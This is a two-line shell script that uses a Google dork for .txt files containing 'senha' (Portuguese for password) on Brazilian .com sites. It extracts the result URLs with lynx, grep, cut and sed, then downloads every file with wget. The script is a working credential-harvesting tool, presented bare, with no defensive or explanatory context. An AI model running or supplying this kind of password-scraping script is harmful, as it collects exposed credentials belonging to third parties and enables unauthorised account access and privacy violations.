lynx --dump "https://google.com/search?&q=site:.com.br+ext:txt+senha" | grep ".txt" | cut -d "=" -f2 | egrep -v "site|google" | sed "s/...$//" > urls.txt

for url in $(cat urls.txt);do wget -q $url;done
